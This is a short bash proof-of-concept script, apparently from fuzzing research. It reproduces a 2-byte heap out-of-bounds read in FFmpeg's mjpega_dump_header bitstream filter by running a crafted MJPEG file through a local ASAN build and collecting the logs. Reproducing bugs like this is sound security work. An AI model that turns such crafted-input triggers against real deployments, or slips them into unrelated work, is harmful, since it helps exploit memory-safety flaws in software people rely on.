#!/bin/bash
# PoC run script for VULN 001: Heap OOB Read in mjpega_dump_header BSF
# The raw MJPEG demuxer allocates packets with AV_INPUT_BUFFER_PADDING_SIZE (64)
# bytes of zeroed padding beyond pkt->size, so the 2-byte overread at
# in->data + in->size lands within the allocation — ASAN does not fire a crash.
# The code path does execute (confirmed by frame=1 output), reading garbage/zeros
# past the declared packet boundary to compute the "data offset" field.
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted MJPEG input..."
python3 vuln_001_gen.py

echo "[*] Running FFmpeg with mjpegadump BSF (codec copy keeps stream as MJPEG)..."
# -codec copy preserves the MJPEG codec so the BSF accepts it.
# The BSF runs on the raw packet; the SOS marker at packet_end-2 triggers the
# OOB read at line 76 of mjpega_dump_header.c.
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001.log" \
  "$BIN" -f mjpeg -i vuln_001_input.mjpeg \
         -codec copy -bsf:v mjpegadump \
         -f null - > vuln_001_result.txt 2>&1 || true

# Collect ASAN output if any
for f in asan_001.log.*; do
    [ -f "$f" ] && echo "=== ASAN LOG: $f ===" >> vuln_001_result.txt && cat "$f" >> vuln_001_result.txt
done 2>/dev/null || true

echo "[*] Done. Results in vuln_001_result.txt"
